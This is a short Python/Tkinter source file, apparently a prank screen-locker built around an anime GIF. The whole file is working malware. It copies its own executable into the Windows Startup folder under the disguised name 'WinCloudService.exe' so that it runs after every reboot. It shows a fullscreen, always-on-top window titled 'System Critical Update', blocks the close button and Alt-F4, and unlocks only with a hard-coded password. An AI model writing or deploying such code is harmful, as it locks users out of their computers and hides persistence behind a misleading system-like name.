import tkinter as tk
from tkinter import messagebox
import os
import sys
import shutil
from PIL import Image, ImageTk, ImageSequence

def resource_path(relative_path):
    """ Gestiona rutas para archivos internos del .exe o ejecución local """
    try:
        # PyInstaller crea una carpeta temporal en _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def persistencia_usuario():
    """ Se copia a la carpeta de Inicio para persistir tras reiniciar """
    if getattr(sys, 'frozen', False):
        ruta_exe = sys.executable
        carpeta_inicio = os.path.join(os.getenv('APPDATA'), 
                                      r'Microsoft\Windows\Start Menu\Programs\Startup')
        destino = os.path.join(carpeta_inicio, "WinCloudService.exe")
        
        if not os.path.exists(destino):
            try:
                shutil.copy2(ruta_exe, destino)
            except:
                pass

class MalkimaApp:
    def __init__(self, root):
        self.root = root
        self.root.title("System Critical Update")
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        self.root.configure(bg='black')
        
        # Bloqueos de cierre
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        self.root.bind("<Alt-F4>", lambda e: "break")

        # Configuración del Canvas para el GIF
        self.canvas = tk.Canvas(root, width=root.winfo_screenwidth(), 
                                height=root.winfo_screenheight(), 
                                bg='black', highlightthickness=0)
        self.canvas.pack()
        
        # Cargar GIF de Makima
        try:
            # Buscamos en assets (local) o en la raíz (si es .exe)
            try:
                path_gif = resource_path(os.path.join("assets", "gifmakima.gif"))
                if not os.path.exists(path_gif): # Si ya está compilado
                     path_gif = resource_path("gifmakima.gif")
            except:
                path_gif = resource_path("gifmakima.gif")

            self.img_obj = Image.open(path_gif)
            self.frames = [ImageTk.PhotoImage(img.copy().convert("RGBA")) for img in ImageSequence.Iterator(self.img_obj)]
            self.current_frame = 0
            self.animate_gif()
        except Exception as e:
            self.canvas.create_text(root.winfo_screenwidth()//2, 200, 
                                    text=f"Error cargando recursos", fill="white", font=("Arial", 20))

        # Cuadro de entrada
        self.entry = tk.Entry(root, show="*", font=("Arial", 24), justify='center', bg="#1a1a1a", fg="white", insertbackground="white")
        self.entry.place(relx=0.5, rely=0.85, anchor='center')
        self.entry.focus_set()
        self.entry.bind('<Return>', self.verificar)

    def animate_gif(self):
        frame = self.frames[self.current_frame]
        self.canvas.delete("all")
        self.canvas.create_image(self.root.winfo_screenwidth()//2, 
                                 self.root.winfo_screenheight()//2, image=frame)
        self.current_frame = (self.current_frame + 1) % len(self.frames)
        self.root.after(40, self.animate_gif)

    def verificar(self, event=None):
        if self.entry.get().lower() == "esotilin":
            self.root.destroy()
        else:
            self.entry.delete(0, tk.END)

if __name__ == "__main__":
    persistencia_usuario()
    root = tk.Tk()
    app = MalkimaApp(root)
    root.mainloop()